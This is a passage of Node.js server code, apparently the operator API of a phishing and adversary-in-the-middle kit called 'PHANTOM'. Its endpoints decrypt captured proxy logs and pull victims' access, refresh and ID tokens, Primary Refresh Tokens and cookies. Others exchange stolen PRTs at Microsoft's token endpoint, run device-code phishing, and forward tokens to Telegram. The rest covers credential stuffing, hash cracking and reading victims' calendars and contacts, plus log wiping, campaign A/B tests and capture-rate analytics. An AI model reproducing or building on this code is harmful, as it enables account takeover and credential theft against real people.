                } catch (e) { return { error: 'Failed to decrypt', raw: line }; }
            });
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ filename, entries }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/export/all' && AdmZip) {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            if (files.length === 0) { res.writeHead(404); res.end(JSON.stringify({ error: 'No logs' })); return; }
            const zip = new AdmZip();
            files.forEach(f => { const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f)); zip.addFile(f, content); });
            const zipBuffer = zip.toBuffer();
            res.writeHead(200, { 'Content-Type': 'application/zip', 'Content-Disposition': `attachment; filename=all_sessions_${Date.now()}.zip` });
            res.end(zipBuffer);
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/visits') {
        try {
            if (!fs.existsSync(VISITS_LOG_FILE)) { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ visits: [], total: 0, uniqueIPs: 0, today: 0 })); return; }
            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            const visits = lines.map(line => JSON.parse(line));
            visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
            const now = new Date();
            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ visits: visits.slice(0, 100), total: visits.length, uniqueIPs, today: todayVisits.length }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/vault/scan' && req.method === 'POST') {
        try {
            const tokens = vault.scanLogs();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, count: tokens.length }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/vault/tokens') {
        try { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true, tokens: vault.tokens || [] })); }
        catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/vault/stats') {
        try { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true, stats: vault.getStats() })); }
        catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/vault/healthcheck' && req.method === 'POST') {
        try { const results = await vault.healthCheckAll(); res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true, results })); }
        catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/vault/exchange' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { tokenValue } = JSON.parse(body);
                if (!tokenValue) { res.writeHead(400); res.end(JSON.stringify({ error: 'Token value required' })); return; }
                const data = await vault.exchangeToken(tokenValue);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, data }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        });
        return;
    }

    // ============================================================
    //  NEW ENHANCED API ENDPOINTS
    // ============================================================

    // ---- AI Endpoints ----
    if (apiPath === '/api/ai/analysis' && req.method === 'GET') {
        const results = runAIAnalysis(vault.tokens);
        res.json({ results });
        return;
    }
    if (apiPath === '/api/ai/analyze' && req.method === 'POST') {
        const results = runAIAnalysis(vault.tokens);
        res.json({ success: true, results });
        return;
    }
    if (apiPath === '/api/ai/hibp' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { emails } = JSON.parse(body);
            const results = [];
            for (const email of (emails || [])) {
                results.push(await checkHIBP(email));
            }
            res.json({ results });
        });
        return;
    }
    if (apiPath === '/api/ai/crack' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { hashes } = JSON.parse(body);
            const results = [];
            for (const hash of (hashes || [])) {
                results.push(await crackHash(hash));
            }
            res.json({ cracked: results });
        });
        return;
    }
    if (apiPath === '/api/ai/ocr' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { filePath } = JSON.parse(body);
            const result = await scanOCR(filePath);
            res.json({ extracted: result });
        });
        return;
    }

    // ---- Automation ----
    if (apiPath === '/api/rules' && req.method === 'GET') {
        res.json({ rules: loadRules() });
        return;
    }
    if (apiPath === '/api/rules' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const rule = JSON.parse(body);
            if (rule._delete) {
                const rules = loadRules();
                const idx = rules.findIndex(r => r.id === rule.id);
                if (idx !== -1) rules.splice(idx, 1);
                saveRules(rules);
                res.json({ success: true });
            } else {
                const rules = loadRules();
                if (!rule.id) rule.id = Date.now().toString();
                const idx = rules.findIndex(r => r.id === rule.id);
                if (idx !== -1) rules[idx] = rule;
                else rules.push(rule);
                saveRules(rules);
                res.json({ success: true });
            }
        });
        return;
    }
    if (apiPath === '/api/rules/suggest' && req.method === 'POST') {
        const suggestions = generateSuggestions(loadRules(), vault.tokens);
        res.json({ suggestions });
        return;
    }
    if (apiPath === '/api/rules/rate' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { suggestionId, rating } = JSON.parse(body);
            // Store feedback for future improvements
            console.log(`Suggestion ${suggestionId} rated ${rating}`);
            res.json({ success: true });
        });
        return;
    }

    // ---- Integrations ----
    if (apiPath.startsWith('/api/integrations/shodan')) {
        const ip = url.searchParams.get('ip');
        if (!ip) { res.writeHead(400); res.end(JSON.stringify({ error: 'IP required' })); return; }
        const data = await shodanLookup(ip);
        res.json(data);
        return;
    }
    if (apiPath.startsWith('/api/integrations/virustotal')) {
        const hash = url.searchParams.get('hash');
        if (!hash) { res.writeHead(400); res.end(JSON.stringify({ error: 'Hash required' })); return; }
        const data = await vtLookup(hash);
        res.json(data);
        return;
    }
    if (apiPath === '/api/integrations/webhook/test' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { url } = JSON.parse(body);
            if (!url) { res.writeHead(400); res.end(JSON.stringify({ error: 'URL required' })); return; }
            try {
                await axios.post(url, { text: 'Test from PHANTOM' });
                res.json({ success: true });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });
        return;
    }

    // ---- OPSEC ----
    if (apiPath === '/api/opsec/apply' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { tor, ipRotInterval } = JSON.parse(body);
            applyOPSEC(tor, ipRotInterval);
            res.json({ success: true });
        });
        return;
    }
    if (apiPath === '/api/opsec/wipe' && req.method === 'POST') {
        wipeOldLogs();
        res.json({ success: true });
        return;
    }

    // ---- Replay Schedule ----
    if (apiPath === '/api/replay/schedule' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { filename, interval } = JSON.parse(body);
            scheduleReplay(filename, interval);
            res.json({ success: true });
        });
        return;
    }

    // ---- System Stats ----
    if (apiPath === '/api/system/stats' && req.method === 'GET') {
        const cpu = process.cpuUsage().system / 10000;
        const mem = process.memoryUsage().heapUsed / (1024*1024*1024) * 100;
        const net = 0; // placeholder
        res.json({ cpu: Math.round(cpu), ram: Math.round(mem), net });
        return;
    }

    // ---- Crypto Config ----
    if (apiPath === '/api/crypto/config' && req.method === 'GET') {
        res.json(loadCryptoConfig());
        return;
    }
    if (apiPath === '/api/crypto/config' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const config = JSON.parse(body);
            saveCryptoConfig(config);
            res.json({ success: true });
        });
        return;
    }

    // ---- Test Simulation ----
    if (apiPath === '/api/test/simulate' && req.method === 'POST') {
        if (!puppeteer) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'puppeteer not installed' }));
            return;
        }
        (async () => {
            try {
                const browser = await puppeteer.launch({ headless: 'new' });
                const page = await browser.newPage();
                await page.goto('http://localhost:' + PORT + PROXY_ENTRY_POINT);
                // Simulate credentials
                await page.type('input[name="loginfmt"]', 'test@example.com');
                await page.click('input[type="submit"]');
                await page.waitForTimeout(2000);
                const screenshot = await page.screenshot({ encoding: 'base64' });
                await browser.close();
                res.json({ success: true, screenshot });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        })();
        return;
    }

    // ---- Credential Stuffing ----
    if (apiPath === '/api/stuffing' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { tokenId } = JSON.parse(body);
            const results = await tryCredentialStuffing(tokenId);
            res.json(results);
        });
        return;
    }

    // ---- OWA Extensions (Calendar, Contacts, Tasks, Rules) ----
    if (apiPath === '/api/webmail/calendar' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { accessToken } = JSON.parse(body);
            const graph = new GraphClient(accessToken);
            try {
                const events = await graph.get('/me/calendar/events?$top=10');
                res.json({ events: events.value || [] });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });
        return;
    }
    if (apiPath === '/api/webmail/contacts' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { accessToken } = JSON.parse(body);
            const graph = new GraphClient(accessToken);
            try {
                const contacts = await graph.get('/me/contacts?$top=10');
                res.json({ contacts: contacts.value || [] });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });
        return;
    }
    if (apiPath === '/api/webmail/tasks' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { accessToken } = JSON.parse(body);
            const graph = new GraphClient(accessToken);
            try {
                const tasks = await graph.get('/me/tasks?$top=10');
                res.json({ tasks: tasks.value || [] });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });
        return;
    }
    if (apiPath === '/api/webmail/rules' && req.method === 'GET') {
        res.json({ rules: loadMailRules() });
        return;
    }
    if (apiPath === '/api/webmail/rules' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const rule = JSON.parse(body);
            if (rule._delete) {
                const rules = loadMailRules();
                const idx = rules.findIndex(r => r.id === rule.id);
                if (idx !== -1) rules.splice(idx, 1);
                saveMailRules(rules);
                res.json({ success: true });
            } else {
                const rules = loadMailRules();
                if (!rule.id) rule.id = Date.now().toString();
                rules.push(rule);
                saveMailRules(rules);
                res.json({ success: true });
            }
        });
        return;
    }

    // ---- Campaign Enhancements ----
    if (apiPath === '/api/campaigns/pixel' && req.method === 'POST') {
        const pixelUrl = generateTrackingPixel();
        res.json({ pixelUrl });
        return;
    }
    if (apiPath === '/api/campaigns/abtest' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { name, domain, variantA, variantB } = JSON.parse(body);
            const campaignId = createABTest(name, domain, variantA, variantB);
            res.json({ success: true, campaignId });
        });
        return;
    }

    // ---- Push Notifications (PWA) ----
    if (apiPath === '/api/push/subscribe' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const subscription = JSON.parse(body);
            // Store subscription in file/db
            console.log('Push subscription:', subscription);
            res.json({ success: true });
        });
        return;
    }
    if (apiPath === '/api/push/send' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { message } = JSON.parse(body);
            // Broadcast push to all subscribers
            console.log('Push message:', message);
            res.json({ success: true });
        });
        return;
    }

    // ---- Plugins ----
    if (apiPath === '/api/plugins' && req.method === 'GET') {
        res.json({ plugins: loadPluginsFromDisk() });
        return;
    }
    if (apiPath === '/api/plugins/toggle' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { id } = JSON.parse(body);
            // Toggle enabled state in a plugin config file
            console.log(`Toggled plugin ${id}`);
            res.json({ success: true });
        });
        return;
    }
    if (apiPath === '/api/plugins/uninstall' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { id } = JSON.parse(body);
            const file = path.join(PLUGINS_DIR, id + '.js');
            if (fs.existsSync(file)) fs.unlinkSync(file);
            res.json({ success: true });
        });
        return;
    }

    // ---- Device Code (dashboard) ----
    if (apiPath === '/api/device/request' && req.method === 'POST') {
        try {
            const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
            const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
                new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
            );
            const data = response.data;
            const flow = {
                device_code: data.device_code,
                user_code: data.user_code,
                verification_uri: data.verification_uri,
                expires_in: data.expires_in,
                interval: data.interval,
                status: 'pending',
                created: new Date().toISOString(),
                client_id: clientId,
                session_id: crypto.randomBytes(16).toString('hex')
            };
            deviceFlows.push(flow);
            saveDeviceFlows();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(data));
        } catch (error) { res.writeHead(500); res.end(JSON.stringify({ error: error.response?.data || error.message })); }
        return;
    }
    if (apiPath === '/api/device/token' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const { device_code } = JSON.parse(body);
            if (!device_code) { res.writeHead(400); res.end(JSON.stringify({ error: 'device_code required' })); return; }
            try {
                const flow = deviceFlows.find(f => f.device_code === device_code);
                const clientId = flow?.client_id || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                    new URLSearchParams({ client_id: clientId, device_code, grant_type: 'urn:ietf:params:oauth:grant-type:device_code' }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                const tokens = response.data;
                if (flow) {
                    flow.status = 'approved';
                    flow.access_token = tokens.access_token;
                    flow.refresh_token = tokens.refresh_token;
                    flow.id_token = tokens.id_token;
                    flow.approved = new Date().toISOString();
                    saveDeviceFlows();
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(tokens));
            } catch (error) {
                if (error.response?.data?.error === 'authorization_pending') {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'authorization_pending' }));
                } else if (error.response?.data?.error === 'expired_token') {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'expired_token' }));
                } else {
                    res.writeHead(500, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: error.response?.data || error.message }));
                }
            }
        });
        return;
    }
    if (apiPath === '/api/device/history') {
        try { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true, flows: deviceFlows })); }
        catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/device/manual' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { user_code } = JSON.parse(body);
                if (!user_code) { res.writeHead(400); res.end(JSON.stringify({ error: 'user_code required' })); return; }
                const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
                const response = await axios.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
                    new URLSearchParams({ client_id: clientId, scope: 'https://graph.microsoft.com/.default offline_access' }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                const data = response.data;
                const flow = {
                    device_code: data.device_code,
                    user_code: user_code,
                    verification_uri: data.verification_uri,
                    expires_in: data.expires_in,
                    interval: data.interval,
                    status: 'pending',
                    created: new Date().toISOString(),
                    client_id: clientId,
                    session_id: crypto.randomBytes(16).toString('hex'),
                    manual_submitted: true
                };
                deviceFlows.push(flow);
                saveDeviceFlows();
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, flow }));
            } catch (error) { res.writeHead(500); res.end(JSON.stringify({ error: error.response?.data || error.message })); }
        });
        return;
    }
    if (apiPath === '/api/device/use' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { session_id } = JSON.parse(body);
                if (!session_id) { res.writeHead(400); res.end(JSON.stringify({ error: 'session_id required' })); return; }
                const flow = deviceFlows.find(f => f.session_id === session_id);
                if (!flow) { res.writeHead(404); res.end(JSON.stringify({ error: 'Flow not found' })); return; }
                if (!flow.access_token) { res.writeHead(400); res.end(JSON.stringify({ error: 'No access token available' })); return; }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, access_token: flow.access_token, refresh_token: flow.refresh_token, id_token: flow.id_token, username: flow.username || 'Unknown' }));
            } catch (error) { res.writeHead(500); res.end(JSON.stringify({ error: error.message })); }
        });
        return;
    }
    // PRT endpoints
    if (apiPath === '/api/prt/scan' && req.method === 'POST') {
        try {
            const prts = [];
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            for (const file of files) {
                try {
                    const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
                    const lines = content.split('\n').filter(line => line.trim());
                    for (const line of lines) {
                        try {
                            const entry = JSON.parse(line);
                            const iv = Object.keys(entry)[0];
                            const encrypted = entry[iv];
                            const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                            let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                            decrypted = Buffer.concat([decrypted, decipher.final()]);
                            const obj = JSON.parse(decrypted.toString('utf-8'));
                            const body = obj.proxyRequestBody;
                            if (body) {
                                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                                const prtMatch = bodyStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (prtMatch) {
                                    prts.push({ prt: prtMatch[1], timestamp: obj.timestamp || new Date().toISOString(), source: obj.proxyRequestURL || 'Unknown', username: vault.extractUsernameFromToken(prtMatch[1]) });
                                }
                            }
                        } catch (e) {}
                    }
                } catch (e) {}
            }
            prtStorage.prts = prts;
            prtStorage.lastScan = new Date().toISOString();
            savePRTStorage();
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, count: prts.length, prts }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/prt/list') {
        try { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify({ success: true, prts: prtStorage.prts || [] })); }
        catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/prt/exchange' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { prt } = JSON.parse(body);
                if (!prt) { res.writeHead(400); res.end(JSON.stringify({ error: 'PRT required' })); return; }
                const response = await retry(async () => {
                    return await axios.post(
                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                            assertion: prt,
                            requested_token_use: 'on_behalf_of',
                            scope: 'https://graph.microsoft.com/.default offline_access'
                        }),
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                    );
                }, 3, 1500, 2);
                const tokens = response.data;
                const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                await sendToTelegram({ sessionId: 'prt_exchange', tokens }, 'prt', ip);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, data: tokens }));
            } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.response?.data || err.message })); }
        });
        return;
    }
    if (apiPath === '/api/prt/health' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { prt } = JSON.parse(body);
                if (!prt) { res.writeHead(400); res.end(JSON.stringify({ error: 'PRT required' })); return; }
                const response = await retry(async () => {
                    return await axios.post(
                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                            assertion: prt,
                            requested_token_use: 'on_behalf_of',
                            scope: 'https://graph.microsoft.com/.default offline_access'
                        }),
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                    );
                }, 2, 1000, 2);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, valid: true, data: response.data }));
            } catch (err) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, valid: false, error: err.response?.data?.error_description || err.message }));
            }
        });
        return;
    }
    if (apiPath === '/api/prt/health-all' && req.method === 'POST') {
        try {
            const results = [];
            for (const item of prtStorage.prts || []) {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                                assertion: item.prt,
                                requested_token_use: 'on_behalf_of',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    results.push({ username: item.username, valid: true, data: response.data });
                } catch (e) {
                    results.push({ username: item.username, valid: false, error: e.message });
                }
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, results }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/prt/exchange-all' && req.method === 'POST') {
        try {
            const results = [];
            for (const item of prtStorage.prts || []) {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
                                grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                                assertion: item.prt,
                                requested_token_use: 'on_behalf_of',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                        );
                    }, 2, 1000, 2);
                    results.push({ username: item.username, success: true, access_token: response.data.access_token?.slice(0, 40) + '...', refresh_token: response.data.refresh_token?.slice(0, 40) + '...' });
                } catch (e) {
                    results.push({ username: item.username, success: false, error: e.message });
                }
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, results }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/prt/stats') {
        try {
            const total = prtStorage.prts?.length || 0;
            const uniqueUsers = new Set((prtStorage.prts || []).map(p => p.username)).size;
            const healthy = (prtStorage.prts || []).filter(p => p.last_refresh).length;
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, stats: { total, uniqueUsers, healthy, lastScan: prtStorage.lastScan } }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath.startsWith('/api/tokens/')) {
        const filename = apiPath.replace('/api/tokens/', '');
        const filePath = path.join(LOGS_DIRECTORY, filename);
        if (!fs.existsSync(filePath)) { res.writeHead(404); res.end(JSON.stringify({ error: 'Log not found' })); return; }
        try {
            const content = fs.readFileSync(filePath, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            const tokens = { access_tokens: [], refresh_tokens: [], id_tokens: [], prt_tokens: [], cookies: [], sessions: [], username: 'Unknown' };
            let username = 'Unknown';
            for (const line of lines) {
                try {
                    const entry = JSON.parse(line);
                    const iv = Object.keys(entry)[0];
                    const encrypted = entry[iv];
                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                    decrypted = Buffer.concat([decrypted, decipher.final()]);
                    const obj = JSON.parse(decrypted.toString('utf-8'));
                    const body = obj.proxyRequestBody;
                    if (body) {
                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                        if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                        if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
                        const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                        if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));
                        const prtMatch = bodyStr.match(/prt=([^&]+)/i);
                        if (prtMatch) tokens.prt_tokens.push(decodeURIComponent(prtMatch[1]));
                        try {
                            const parsed = typeof body === 'string' ? JSON.parse(body) : body;
                            if (parsed.username || parsed.login || parsed.user || parsed.Email) {
                                username = parsed.username || parsed.login || parsed.user || parsed.Email;
                            }
                        } catch (e) {}
                    }
                    if (obj.proxyResponseHeaders && obj.proxyResponseHeaders['set-cookie']) {
                        const cookieHeaders = obj.proxyResponseHeaders['set-cookie'];
                        const arr = Array.isArray(cookieHeaders) ? cookieHeaders : [cookieHeaders];
                        arr.forEach(c => { const [nameVal] = c.split(';'); if (nameVal) tokens.cookies.push(nameVal); });
                    }
                } catch (e) {}
            }
            tokens.username = username;
            if (tokens.access_tokens.length > 0) {
                try {
                    const parts = tokens.access_tokens[0].split('.');
                    if (parts.length === 3) {
                        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                        tokens.username = payload.email || payload.preferred_username || payload.upn || tokens.username;
                    }
                } catch (e) {}
            }
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true, tokens }));
        } catch (err) { res.writeHead(500); res.end(JSON.stringify({ error: err.message })); }
        return;
    }
    if (apiPath === '/api/analytics') {
        try {
            let visits = [], captures = [];
            if (fs.existsSync(VISITS_LOG_FILE)) {
                const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                visits = lines.map(line => JSON.parse(line));
            }
            const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            captures = logFiles.map(f => { const stat = fs.statSync(path.join(LOGS_DIRECTORY, f)); return { file: f, modified: stat.mtime, size: stat.size }; });
            const now = new Date();
            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
            const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
            const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
            const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
            const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
            const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
            const todayCaptures = captures.filter(c => c.modified >= today);
            const weekCaptures = captures.filter(c => c.modified >= weekAgo);
            const monthCaptures = captures.filter(c => c.modified >= monthAgo);
            const conversionRate = {
                today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
                week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
                month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
                total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
            };
            const dailyCaptures = {}, dailyVisits = {};
            for (let i = 6; i >= 0; i--) {
                const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
                const key = d.toDateString();
                dailyCaptures[key] = 0;
                dailyVisits[key] = 0;
            }
            captures.forEach(c => { const key = new Date(c.modified).toDateString(); if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++; });
            visits.forEach(v => { const key = new Date(v.timestamp).toDateString(); if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++; });
            const domains = {};
            visits.forEach(v => {
                const url = v.url || '';
                const match = url.match(/https?:\/\/([^\/]+)/);
                if (match) { const domain = match[1]; domains[domain] = (domains[domain] || 0) + 1; }
            });
            const topDomains = Object.entries(domains).sort((a, b) => b[1] - a[1]).slice(0, 5).map(([domain, count]) => ({ domain, count }));
            const uniqueIPs = new Set(visits.map(v => v.ip)).size;
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                analytics: {
                    visits: { total: visits.length, today: todayVisits.length, week: weekVisits.length, month: monthVisits.length },
                    captures: { total: captures.length, today: todayCaptures.length, week: weekCaptures.length, month: monthCaptures.length },
                    conversionRate,
                    uniqueIPs,
                    dailyCaptures,
                    dailyVisits,
                    topDomains,
                    captureTimeline: captures.map(c => ({ date: c.modified, file: c.file, size: c.size }))
                }
            }));
